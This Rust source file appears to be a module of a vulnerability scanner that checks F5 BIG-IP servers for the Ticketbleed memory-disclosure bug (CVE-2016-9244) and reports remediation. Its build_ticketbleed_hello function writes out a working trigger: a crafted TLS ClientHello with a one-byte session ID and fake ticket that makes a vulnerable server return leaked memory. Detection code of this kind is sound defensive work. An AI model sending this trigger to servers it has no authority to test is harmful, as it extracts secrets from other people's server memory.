/// Ticketbleed Vulnerability Checker (CVE-2016-9244)
///
/// Tests for F5 BIG-IP session ticket memory disclosure vulnerability.
/// Allows attackers to extract 31 bytes of uninitialized memory per request.

use super::{VulnChecker, VulnCheckResult, Severity, connect_tcp, tls_types, build_client_hello};
use std::io::{Read, Write};
use std::time::Duration;

pub struct TicketbleedChecker {
    timeout: Duration,
}

impl TicketbleedChecker {
    pub fn new() -> Self {
        Self {
            timeout: Duration::from_secs(10),
        }
    }

    /// Check for Ticketbleed vulnerability
    /// Vulnerable servers return session IDs with leaked memory
    fn check_ticketbleed(&self, host: &str, port: u16) -> Result<(bool, Vec<String>), String> {
        let mut evidence = Vec::new();

        // First, get a valid session ticket from the server
        let ticket = match self.get_session_ticket(host, port) {
            Ok(Some(ticket)) => {
                evidence.push(format!("Got session ticket: {} bytes", ticket.len()));
                ticket
            }
            Ok(None) => {
                evidence.push("Server does not support session tickets".to_string());
                return Ok((false, evidence));
            }
            Err(e) => {
                return Err(format!("Failed to get session ticket: {}", e));
            }
        };

        // Now reconnect with a modified ticket (1-byte session ID)
        // Vulnerable servers will return 32-byte session ID with leaked memory
        let session_ids = self.test_with_modified_ticket(host, port, &ticket)?;

        if session_ids.is_empty() {
            evidence.push("Could not complete session resumption test".to_string());
            return Ok((false, evidence));
        }

        // Check for memory leak indicators
        let mut leak_detected = false;
        for (attempt, session_id) in session_ids.iter().enumerate() {
            evidence.push(format!("Attempt {}: session_id {} bytes", attempt + 1, session_id.len()));

            // Ticketbleed causes 32-byte session IDs with varying content
            if session_id.len() == 32 {
                // Check if bytes beyond the first seem random (leaked memory)
                let unique_bytes: std::collections::HashSet<u8> = session_id[1..].iter().copied().collect();

                // If many unique bytes, likely leaked memory
                if unique_bytes.len() > 10 {
                    leak_detected = true;
                    evidence.push("Session ID contains high entropy - possible memory leak".to_string());
                }
            }
        }

        // Compare session IDs from multiple attempts
        if session_ids.len() >= 2 {
            let id1 = &session_ids[0];
            let id2 = &session_ids[1];

            if id1.len() == 32 && id2.len() == 32 && id1[1..] != id2[1..] {
                // Different memory content in each response - VULNERABLE!
                leak_detected = true;
                evidence.push("Session IDs differ in leaked bytes - CONFIRMED VULNERABLE".to_string());
            }
        }

        Ok((leak_detected, evidence))
    }

    /// Get a session ticket from the server
    fn get_session_ticket(&self, host: &str, port: u16) -> Result<Option<Vec<u8>>, String> {
        let mut stream = connect_tcp(host, port, self.timeout)?;

        // Request session ticket via extension
        let session_ticket_ext = vec![
            0x00, 0x23, // Extension type: session_ticket (35)
            0x00, 0x00, // Extension length: 0 (empty = request new ticket)
        ];

        let cipher_suites = vec![
            0x009c, // TLS_RSA_WITH_AES_128_GCM_SHA256
            0x009d, // TLS_RSA_WITH_AES_256_GCM_SHA384
            0x002f, // TLS_RSA_WITH_AES_128_CBC_SHA
            0x0035, // TLS_RSA_WITH_AES_256_CBC_SHA
        ];

        let client_hello = build_client_hello(tls_types::VERSION_TLS12, &cipher_suites, &session_ticket_ext);

        stream.write_all(&client_hello)
            .map_err(|e| format!("Failed to send ClientHello: {}", e))?;

        // Read all server handshake messages
        let mut buffer = vec![0u8; 16384];
        let mut total = 0;
        let mut ticket = None;

        loop {
            match stream.read(&mut buffer[total..]) {
                Ok(0) => break,
                Ok(n) => {
                    total += n;

                    // Look for NewSessionTicket in the response
                    if let Some(t) = self.extract_session_ticket(&buffer[..total]) {
                        ticket = Some(t);
                    }

                    // Check for handshake completion
                    if self.has_finished(&buffer[..total]) {
                        break;
                    }

                    if total >= buffer.len() - 100 {
                        break;
                    }
                }
                Err(_) => break,
            }
        }

        Ok(ticket)
    }

    /// Test with modified ticket to trigger memory leak
    fn test_with_modified_ticket(&self, host: &str, port: u16, _ticket: &[u8]) -> Result<Vec<Vec<u8>>, String> {
        let mut session_ids = Vec::new();

        // Perform multiple attempts to detect varying leaked memory
        for _ in 0..3 {
            let mut stream = connect_tcp(host, port, self.timeout)?;

            // Create ClientHello with 1-byte session ID and session ticket
            let client_hello = self.build_ticketbleed_hello();

            if stream.write_all(&client_hello).is_err() {
                continue;
            }

            // Read ServerHello and extract session ID
            let mut buffer = vec![0u8; 4096];
            if let Ok(n) = stream.read(&mut buffer) {
                if n >= 5 && buffer[0] == tls_types::CONTENT_TYPE_HANDSHAKE {
                    if let Some(session_id) = self.extract_session_id(&buffer[..n]) {
                        session_ids.push(session_id);
                    }
                }
            }
        }

        Ok(session_ids)
    }

    /// Build ClientHello designed to trigger Ticketbleed
    fn build_ticketbleed_hello(&self) -> Vec<u8> {
        let mut hello = Vec::new();

        // Client version
        hello.extend_from_slice(&tls_types::VERSION_TLS12);

        // Random (32 bytes)
        hello.extend_from_slice(&[0u8; 32]);

        // Session ID - 1 byte (this is the Ticketbleed trigger)
        // F5 copies this 1 byte but returns 32 bytes, leaking 31 bytes
        hello.push(0x01); // Session ID length: 1
        hello.push(0x00); // Single byte session ID

        // Cipher suites
        let cipher_suites = vec![0x009c, 0x002f]; // AES-GCM and AES-CBC
        let cs_len = (cipher_suites.len() * 2) as u16;
        hello.push((cs_len >> 8) as u8);
        hello.push(cs_len as u8);
        for cs in cipher_suites {
            hello.push((cs >> 8) as u8);
            hello.push((cs) as u8);
        }

        // Compression methods
        hello.push(1);
        hello.push(0);

        // Extensions
        let mut extensions = Vec::new();

        // Session ticket extension with fake ticket
        extensions.push(0x00);
        extensions.push(0x23); // session_ticket type
        extensions.push(0x00);
        extensions.push(0x20); // 32-byte fake ticket
        extensions.extend_from_slice(&[0x41; 32]); // Fake ticket data

        hello.push((extensions.len() >> 8) as u8);
        hello.push(extensions.len() as u8);
        hello.extend_from_slice(&extensions);

        // Build handshake record
        let mut record = Vec::new();
        record.push(tls_types::HANDSHAKE_TYPE_CLIENT_HELLO);
        record.push(0);
        record.push((hello.len() >> 8) as u8);
        record.push(hello.len() as u8);
        record.extend_from_slice(&hello);

        // Build TLS record
        let mut tls_record = Vec::new();
        tls_record.push(tls_types::CONTENT_TYPE_HANDSHAKE);
        tls_record.extend_from_slice(&tls_types::VERSION_TLS12);
        tls_record.push((record.len() >> 8) as u8);
        tls_record.push(record.len() as u8);
        tls_record.extend_from_slice(&record);

        tls_record
    }

    /// Extract session ticket from NewSessionTicket message
    fn extract_session_ticket(&self, data: &[u8]) -> Option<Vec<u8>> {
        let mut pos = 0;

        while pos + 5 < data.len() {
            let content_type = data[pos];
            let length = ((data[pos + 3] as usize) << 8) | (data[pos + 4] as usize);

            if content_type == tls_types::CONTENT_TYPE_HANDSHAKE && pos + 5 + length <= data.len() {
                let record = &data[pos + 5..pos + 5 + length];

                // Look for NewSessionTicket (type 4)
                if !record.is_empty() && record[0] == 0x04 {
                    // NewSessionTicket format:
                    // type (1) + length (3) + lifetime (4) + ticket_len (2) + ticket
                    if record.len() > 10 {
                        let ticket_len = ((record[8] as usize) << 8) | (record[9] as usize);
                        if record.len() >= 10 + ticket_len {
                            return Some(record[10..10 + ticket_len].to_vec());
                        }
                    }
                }
            }

            pos += 5 + length;
        }

        None
    }

    /// Extract session ID from ServerHello
    fn extract_session_id(&self, data: &[u8]) -> Option<Vec<u8>> {
        // Skip TLS record header (5 bytes) and handshake header (4 bytes)
        // ServerHello: version (2) + random (32) + session_id_len (1) + session_id
        if data.len() < 44 {
            return None;
        }

        let session_id_len = data[43] as usize;
        if data.len() >= 44 + session_id_len {
            return Some(data[44..44 + session_id_len].to_vec());
        }

        None
    }

    /// Check if Finished message is present
    fn has_finished(&self, data: &[u8]) -> bool {
        let mut pos = 0;

        while pos + 5 < data.len() {
            let content_type = data[pos];
            let length = ((data[pos + 3] as usize) << 8) | (data[pos + 4] as usize);

            // ChangeCipherSpec or encrypted data indicates handshake completion
            if content_type == tls_types::CONTENT_TYPE_CHANGE_CIPHER_SPEC {
                return true;
            }

            if pos + 5 + length > data.len() {
                break;
            }
            pos += 5 + length;
        }

        false
    }
}

impl Default for TicketbleedChecker {
    fn default() -> Self {
        Self::new()
    }
}

impl VulnChecker for TicketbleedChecker {
    fn name(&self) -> &str {
        "Ticketbleed"
    }

    fn cve(&self) -> Option<&str> {
        Some("CVE-2016-9244")
    }

    fn description(&self) -> &str {
        "F5 BIG-IP session ticket memory disclosure vulnerability"
    }

    fn check(&self, host: &str, port: u16) -> VulnCheckResult {
        match self.check_ticketbleed(host, port) {
            Ok((true, evidence)) => {
                VulnCheckResult::vulnerable(
                    self.name(),
                    self.cve(),
                    Severity::High,
                    "Server leaks 31 bytes of uninitialized memory per TLS session \
                     resumption request. This can expose sensitive data including \
                     session IDs, keys, or other secrets from server memory.",
                    "Update F5 BIG-IP to a patched version. If using F5 BIG-IP versions \
                     11.4.0 - 11.6.1, 12.0.0 - 12.1.1, or other affected versions, \
                     apply hotfix or upgrade immediately."
                ).with_evidence(evidence)
            }
            Ok((false, evidence)) => {
                VulnCheckResult::not_vulnerable(self.name(), self.cve())
                    .with_evidence(evidence)
            }
            Err(e) => VulnCheckResult::error(self.name(), &e),
        }
    }
}
